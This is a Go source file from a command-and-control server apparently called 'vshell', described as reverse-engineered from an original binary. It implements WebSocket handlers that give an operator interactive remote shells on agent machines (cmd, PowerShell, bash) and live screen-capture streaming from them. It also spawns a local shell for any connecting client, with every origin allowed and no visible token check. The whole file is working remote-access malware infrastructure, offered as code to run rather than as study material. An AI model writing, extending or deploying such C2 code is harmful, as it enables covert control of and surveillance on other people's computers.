package controllers

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os/exec"
	"runtime"
	"sync"
	"time"

	"vshell/c2engine"

	"github.com/gorilla/websocket"
)

// ============================================================================
// WebSocket Terminal Handler
// (reverse-engineered from the real-time terminal in the original binary)
// ============================================================================

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
	CheckOrigin: func(r *http.Request) bool {
		return true // Allow all origins (C2 tool)
	},
}

// WSTerminalSession 表示一个经 WebSocket 连接的终端会话。
// WSTerminalSession represents a WebSocket-connected terminal session.
type WSTerminalSession struct {
	ID         string          `json:"id"`
	ClientID   int64           `json:"client_id"`
	Type       string          `json:"type"` // cmd/powershell/bash/sh
	Rows       int             `json:"rows"`
	Cols       int             `json:"cols"`
	CreatedAt  time.Time       `json:"created_at"`
	LastActive time.Time       `json:"last_active"`
	conn       *websocket.Conn
	cmd        *exec.Cmd
	stdin      io.WriteCloser
	mu         sync.Mutex
	// writeMu serializes all writes to conn. gorilla/websocket requires at most
	// one concurrent writer (its docs and internal flushFrame enforce this);
	// without it the stdout/stderr reader goroutines, the pong sender and the
	// engine result-forward relay could interleave frames.
	writeMu    sync.Mutex
	done       chan struct{}
	closeOnce  sync.Once
	outputBuf  []byte // circular buffer for output history
}

var (
	wsTermSessions   = make(map[string]*WSTerminalSession)
	wsTermMu         sync.RWMutex

	// Screen stream relay: clientID → viewer WebSocket connection
	screenStreams   = make(map[int64]*ScreenViewer)
	screenStreamsMu sync.RWMutex
)

// HandleTerminalWebSocket 将 HTTP 连接升级为终端 WebSocket。
// HandleTerminalWebSocket upgrades an HTTP connection to WebSocket for terminal.
func HandleTerminalWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[WS Terminal] Upgrade failed: %v", err)
		return
	}
	defer conn.Close()

	// Parse parameters.
	// The original frontend connects as
	//   /api/terminal/ws?id=<clientId>&token=<jwt>  (or /terminal/ws)
	// so both "id" and "client_id" are accepted.
	clientIDStr := r.URL.Query().Get("id")
	if clientIDStr == "" {
		clientIDStr = r.URL.Query().Get("client_id")
	}
	termType := r.URL.Query().Get("type")
	if termType == "" {
		termType = "cmd"
	}
	rows := 24
	cols := 80

	var clientID int64
	fmt.Sscanf(clientIDStr, "%d", &clientID)

	// Create session
	wsTermMu.Lock()
	sessionID := fmt.Sprintf("wsterm_%d_%d", clientID, time.Now().UnixNano())
	session := &WSTerminalSession{
		ID:         sessionID,
		ClientID:   clientID,
		Type:       termType,
		Rows:       rows,
		Cols:       cols,
		CreatedAt:  time.Now(),
		LastActive: time.Now(),
		conn:       conn,
		done:       make(chan struct{}),
		outputBuf:  make([]byte, 0, 65536),
	}
	wsTermSessions[sessionID] = session
	wsTermMu.Unlock()

	defer func() {
		wsTermMu.Lock()
		delete(wsTermSessions, sessionID)
		wsTermMu.Unlock()
		session.cleanup()
	}()

	log.Printf("[WS Terminal] Session %s created (type: %s, client: %d)", sessionID, termType, clientID)

	if clientID > 0 {
		// Remote terminal - relay to agent
		session.runRemoteTerminal()
	} else {
		// Local terminal - spawn shell
		session.runLocalTerminal()
	}
}

// runLocalTerminal spawns a local shell process and bridges stdin/stdout to WebSocket
func (ts *WSTerminalSession) runLocalTerminal() {
	var shell string
	var args []string

	if runtime.GOOS == "windows" {
		switch ts.Type {
		case "powershell":
			shell = "powershell.exe"
			args = []string{"-NoExit", "-Command", "-"}
		default:
			shell = "cmd.exe"
		}
	} else {
		switch ts.Type {
		case "bash":
			shell = "/bin/bash"
		case "sh":
			shell = "/bin/sh"
		default:
			shell = "/bin/bash"
		}
	}

	cmd := exec.Command(shell, args...)

	stdin, err := cmd.StdinPipe()
	if err != nil {
		ts.sendError("Failed to create stdin pipe: " + err.Error())
		return
	}
	ts.stdin = stdin

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		ts.sendError("Failed to create stdout pipe: " + err.Error())
		return
	}

	stderr, err := cmd.StderrPipe()
	if err != nil {
		ts.sendError("Failed to create stderr pipe: " + err.Error())
		return
	}

	if err := cmd.Start(); err != nil {
		ts.sendError("Failed to start shell: " + err.Error())
		return
	}

	ts.cmd = cmd

	// Send welcome message
	ts.sendMessage("connected", fmt.Sprintf("Terminal session %s started (%s)\r\n", ts.ID, ts.Type))

	// Read stdout and forward to WebSocket
	var wg sync.WaitGroup
	wg.Add(2)

	go func() {
		defer wg.Done()
		buf := make([]byte, 4096)
		for {
			n, err := stdout.Read(buf)
			if n > 0 {
				ts.sendOutput(buf[:n])
			}
			if err != nil {
				return
			}
		}
	}()

	go func() {
		defer wg.Done()
		buf := make([]byte, 4096)
		for {
			n, err := stderr.Read(buf)
			if n > 0 {
				ts.sendOutput(buf[:n])
			}
			if err != nil {
				return
			}
		}
	}()

	// Read from WebSocket and forward to stdin
	ts.readWebSocketInput()

	// Cleanup
	cmd.Process.Kill()
	wg.Wait()
}

// runRemoteTerminal relays terminal I/O to/from a remote agent
func (ts *WSTerminalSession) runRemoteTerminal() {
	ts.sendMessage("connected", fmt.Sprintf("Remote terminal session %s (client %d)\r\n", ts.ID, ts.ClientID))

	engine := c2engine.GetEngine()

	// Start the terminal on the agent
	startCmd := c2engine.EncodeShellCommand(
		fmt.Sprintf("terminal_start type=%s rows=%d cols=%d", ts.Type, ts.Rows, ts.Cols),
		0,
	)
	task, err := engine.CreateTask(ts.ClientID, startCmd, 0)
	if err != nil {
		ts.sendError("Failed to start remote terminal: " + err.Error())
		return
	}
	_ = task

	// Read from WebSocket and relay to agent
	for {
		_, message, err := ts.conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseNormalClosure) {
				log.Printf("[WS Terminal] %s read error: %v", ts.ID, err)
			}
			break
		}

		ts.LastActive = time.Now()

		// Parse the message
		var msg map[string]interface{}
		if err := json.Unmarshal(message, &msg); err != nil {
			// Plain text - send as stdin
			cmd := c2engine.EncodeShellCommand(fmt.Sprintf("terminal_input:%s", base64.StdEncoding.EncodeToString(message)), 0)
			if _, err := engine.CreateTask(ts.ClientID, cmd, 0); err != nil {
				log.Printf("[WS Terminal] %s CreateTask failed (stdin plain): %v", ts.ID, err)
			}
			continue
		}

		msgType, _ := msg["type"].(string)
		switch msgType {
		case "input":
			data, _ := msg["data"].(string)
			cmd := c2engine.EncodeShellCommand(fmt.Sprintf("terminal_input:%s", data), 0)
			if _, err := engine.CreateTask(ts.ClientID, cmd, 0); err != nil {
				log.Printf("[WS Terminal] %s CreateTask failed (input): %v", ts.ID, err)
			}

		case "resize":
			rows, _ := msg["rows"].(float64)
			cols, _ := msg["cols"].(float64)
			ts.Rows = int(rows)
			ts.Cols = int(cols)
			resizeCmd := c2engine.EncodeShellCommand(
				fmt.Sprintf("terminal_resize rows=%d cols=%d", ts.Rows, ts.Cols),
				0,
			)
			if _, err := engine.CreateTask(ts.ClientID, resizeCmd, 0); err != nil {
				log.Printf("[WS Terminal] %s CreateTask failed (resize): %v", ts.ID, err)
			}

		case "ping":
			ts.sendMessage("pong", nil)

		case "close":
			closeCmd := c2engine.EncodeShellCommand("terminal_close", 5)
			if _, err := engine.CreateTask(ts.ClientID, closeCmd, 0); err != nil {
				log.Printf("[WS Terminal] %s CreateTask failed (close): %v", ts.ID, err)
			}
			return
		}
	}
}

// readWebSocketInput reads messages from WebSocket and writes to shell stdin
func (ts *WSTerminalSession) readWebSocketInput() {
	for {
		_, message, err := ts.conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseNormalClosure) {
				log.Printf("[WS Terminal] %s read error: %v", ts.ID, err)
			}
			break
		}

		ts.LastActive = time.Now()

		// Parse as JSON control message or raw input
		var msg map[string]interface{}
		if err := json.Unmarshal(message, &msg); err != nil {
			// Plain text - write to stdin
			if ts.stdin != nil {
				ts.stdin.Write(message)
			}
			continue
		}

		msgType, _ := msg["type"].(string)
		switch msgType {
		case "input":
			data, _ := msg["data"].(string)
			if ts.stdin != nil {
				ts.stdin.Write([]byte(data))
			}

		case "resize":
			rows, _ := msg["rows"].(float64)
			cols, _ := msg["cols"].(float64)
			ts.Rows = int(rows)
			ts.Cols = int(cols)
			// Try to signal the process about the resize
			// (platform-specific, handled via TIOCSWINSZ on Unix)

		case "ping":
			ts.sendMessage("pong", nil)
		}
	}
}

// sendOutput sends terminal output to the WebSocket client (base64 encoded for binary safety)
func (ts *WSTerminalSession) sendOutput(data []byte) {
	ts.mu.Lock()
	// Append to output buffer (keep last 64KB)
	if len(ts.outputBuf)+len(data) > 65536 {
		if len(data) >= 65536 {
			ts.outputBuf = make([]byte, 0, 65536)
		} else {
			ts.outputBuf = ts.outputBuf[min(len(ts.outputBuf), len(ts.outputBuf)+len(data)-65536):]
		}
	}
	ts.outputBuf = append(ts.outputBuf, data...)
	ts.mu.Unlock()

	msg, _ := json.Marshal(map[string]interface{}{
		"type": "output",
		"data": base64.StdEncoding.EncodeToString(data),
	})

	ts.writeMu.Lock()
	defer ts.writeMu.Unlock()
	ts.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	if err := ts.conn.WriteMessage(websocket.TextMessage, msg); err != nil {
		log.Printf("[WS Terminal] %s write error: %v", ts.ID, err)
	}
}

// sendMessage sends a control message to the WebSocket client
func (ts *WSTerminalSession) sendMessage(msgType string, data interface{}) {
	msg, _ := json.Marshal(map[string]interface{}{
		"type": msgType,
		"data": data,
	})

	ts.writeMu.Lock()
	defer ts.writeMu.Unlock()
	ts.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	ts.conn.WriteMessage(websocket.TextMessage, msg)
}

// sendError sends an error message
func (ts *WSTerminalSession) sendError(errMsg string) {
	ts.sendMessage("error", errMsg)
}

// cleanup releases resources
func (ts *WSTerminalSession) cleanup() {
	ts.closeOnce.Do(func() { close(ts.done) })
	if ts.stdin != nil {
		ts.stdin.Close()
	}
	if ts.cmd != nil && ts.cmd.Process != nil {
		ts.cmd.Process.Kill()
	}
}

// ListWSTerminalSessions 返回所有活跃的 WebSocket 终端会话。
// ListWSTerminalSessions returns all active WebSocket terminal sessions.
func ListWSTerminalSessions() []map[string]interface{} {
	wsTermMu.RLock()
	defer wsTermMu.RUnlock()

	result := make([]map[string]interface{}, 0, len(wsTermSessions))
	for id, ts := range wsTermSessions {
		ts.mu.Lock()
		result = append(result, map[string]interface{}{
			"id":          id,
			"client_id":   ts.ClientID,
			"type":        ts.Type,
			"rows":        ts.Rows,
			"cols":        ts.Cols,
			"created_at":  ts.CreatedAt,
			"last_active": ts.LastActive,
		})
		ts.mu.Unlock()
	}
	return result
}

// ============================================================================
// WebSocket Screen Stream Handler
// (reverse-engineered from ScreenController.Ws)
// ============================================================================

// HandleScreenWebSocket 通过 WebSocket 处理远程屏幕流。
// HandleScreenWebSocket handles remote screen streaming via WebSocket.
func HandleScreenWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[WS Screen] Upgrade failed: %v", err)
		return
	}
	defer conn.Close()

	// The original frontend connects as
	//   /api/screen/ws?id=<clientId>&quality=<q>&token=<jwt>
	// so both "id" and "client_id" are accepted.
	clientIDStr := r.URL.Query().Get("id")
	if clientIDStr == "" {
		clientIDStr = r.URL.Query().Get("client_id")
	}
	qualityStr := r.URL.Query().Get("quality")
	fpsStr := r.URL.Query().Get("fps")

	var clientID int64
	fmt.Sscanf(clientIDStr, "%d", &clientID)

	quality := 50
	fmt.Sscanf(qualityStr, "%d", &quality)
	fps := 10
	fmt.Sscanf(fpsStr, "%d", &fps)

	log.Printf("[WS Screen] Starting screen stream for client %d (quality=%d, fps=%d)", clientID, quality, fps)

	// Register viewer for frame relay
	sv := StartScreenStream(clientID, conn, quality, fps)
	defer StopScreenStream(clientID, sv)

	// Start screen capture on the agent.
	// If the agent is not currently registered, keep the viewer connected
	// (frames may arrive once the agent comes online) — do NOT close the
	// WebSocket, which would abort the relay registered above.
	engine := c2engine.GetEngine()
	startCmd := c2engine.EncodeShellCommand(
		fmt.Sprintf("screen_capture_start quality=%d fps=%d", quality, fps),
		0,
	)
	if _, err := engine.CreateTask(clientID, startCmd, 0); err != nil {
		log.Printf("[WS Screen] client %d not reachable: %v (viewer stays connected)", clientID, err)
	}

	// Read control messages from viewer
	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			break
		}

		var msg map[string]interface{}
		if err := json.Unmarshal(message, &msg); err != nil {
			continue
		}

		msgType, _ := msg["type"].(string)
		switch msgType {
		case "stop":
			stopCmd := c2engine.EncodeShellCommand("screen_capture_stop", 5)
			engine.CreateTask(clientID, stopCmd, 0)
			return

		case "quality":
			q, _ := msg["value"].(float64)
			adjCmd := c2engine.EncodeShellCommand(fmt.Sprintf("screen_capture_quality=%d", int(q)), 5)
			engine.CreateTask(clientID, adjCmd, 0)

		case "fps":
			f, _ := msg["value"].(float64)
			adjCmd := c2engine.EncodeShellCommand(fmt.Sprintf("screen_capture_fps=%d", int(f)), 5)
			engine.CreateTask(clientID, adjCmd, 0)
		}
	}
}

// ============================================================================
// Screen Stream Relay — forwards agent screen frames to viewer WebSocket
// ============================================================================

// ScreenViewer 表示一个经 WebSocket 连接的屏幕查看者。
// ScreenViewer represents a WebSocket-connected screen viewer.
type ScreenViewer struct {
	ClientID  int64           `json:"client_id"`
	Conn      *websocket.Conn `json:"-"`
	Quality   int             `json:"quality"`
	FPS       int             `json:"fps"`
	StartedAt time.Time       `json:"started_at"`
	FrameCount int64          `json:"frame_count"`
	mu        sync.Mutex
	done      chan struct{}
}

// StartScreenStream 注册一个屏幕帧中继查看者。
// StartScreenStream registers a viewer for screen frame relay.
func StartScreenStream(clientID int64, conn *websocket.Conn, quality, fps int) *ScreenViewer {
	sv := &ScreenViewer{
		ClientID:  clientID,
		Conn:      conn,
		Quality:   quality,
		FPS:       fps,
		StartedAt: time.Now(),
		done:      make(chan struct{}),
	}

	screenStreamsMu.Lock()
	// Close any existing viewer for this client, but unregister it FIRST so
	// its handler's deferred StopScreenStream (fired by the conn close) does
	// not find (and kill) the newly registered viewer.
	if existing, ok := screenStreams[clientID]; ok {
		delete(screenStreams, clientID)
		close(existing.done)
		existing.Conn.Close()
	}
	screenStreams[clientID] = sv
	screenStreamsMu.Unlock()

	// Start keepalive goroutine
	go sv.keepalive()

	return sv
}

// StopScreenStream 将 sv 从查看者 map 移除——但仅当它仍是 clientID 的当前查看者时。
// 已被 StartScreenStream 替换连接的过期处理器的延迟清理不得杀掉更新的查看者。
// StopScreenStream removes sv from the viewer map — but only if it is still the
// CURRENT viewer for clientID. A stale handler's deferred cleanup (after its
// conn was replaced by StartScreenStream) must not kill a newer viewer.
func StopScreenStream(clientID int64, sv *ScreenViewer) {
	screenStreamsMu.Lock()
	if cur, ok := screenStreams[clientID]; ok && cur == sv {
		delete(screenStreams, clientID)
		close(sv.done)
		sv.Conn.Close()
	}
	screenStreamsMu.Unlock()
}

// RelayScreenFrame 将屏幕帧转发给已连接的查看者，由 C2 引擎在收到 Agent 屏幕捕获结果时调用。
// 原版前端消费原始二进制 JPEG 帧（以二进制 WebSocket 消息发送，而非 JSON 包装）：
// RelayScreenFrame forwards a screen frame to the connected viewer.
// Called by the C2 engine when a screen capture result arrives from an agent.
//
// The original frontend consumes RAW BINARY JPEG frames:
//
//	t.value.binaryType = "arraybuffer";
//	t.value.onmessage = o => {
//	  if (o.data.byteLength === 0) return;
//	  const r = F(o.data);              // decompress
//	  const c = new Blob([r], {type: "image/jpeg"});
//	  ... drawImage ...
//	}
//
// so frames are sent as binary WebSocket messages (NOT JSON-wrapped).
func RelayScreenFrame(clientID int64, frameData []byte, format string, index int64) {
	screenStreamsMu.RLock()
	sv, ok := screenStreams[clientID]
	screenStreamsMu.RUnlock()

	if !ok {
		return
	}

	sv.mu.Lock()
	sv.FrameCount++
	count := sv.FrameCount
	sv.mu.Unlock()

	sv.mu.Lock()
	sv.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	if err := sv.Conn.WriteMessage(websocket.BinaryMessage, frameData); err != nil {
		sv.mu.Unlock()
		log.Printf("[Screen %d] Write error (frame %d): %v", clientID, count, err)
		StopScreenStream(clientID, sv)
		return
	}
	sv.mu.Unlock()
	_ = format
	_ = index
}

// RelayScreenStop 通知查看者屏幕捕获已停止。
// RelayScreenStop notifies the viewer that screen capture has stopped.
func RelayScreenStop(clientID int64, reason string) {
	screenStreamsMu.RLock()
	sv, ok := screenStreams[clientID]
	screenStreamsMu.RUnlock()

	if !ok {
		return
	}

	msg, _ := json.Marshal(map[string]interface{}{
		"type":   "stopped",
		"reason": reason,
	})

	sv.Conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	sv.Conn.WriteMessage(websocket.TextMessage, msg)

	StopScreenStream(clientID, sv)
}

// keepalive sends periodic pings to keep the WebSocket alive
func (sv *ScreenViewer) keepalive() {
	ticker := time.NewTicker(15 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-sv.done:
			return
		case <-ticker.C:
			sv.mu.Lock()
			sv.Conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			err := sv.Conn.WriteMessage(websocket.PingMessage, nil)
			sv.mu.Unlock()
			if err != nil {
				log.Printf("[Screen %d] Ping failed: %v", sv.ClientID, err)
				StopScreenStream(sv.ClientID, sv)
				return
			}
		}
	}
}

// GetScreenViewer 返回指定客户端的屏幕查看者（若存在）。
// GetScreenViewer returns the screen viewer for a client, if any.
func GetScreenViewer(clientID int64) *ScreenViewer {
	screenStreamsMu.RLock()
	defer screenStreamsMu.RUnlock()
	return screenStreams[clientID]
}
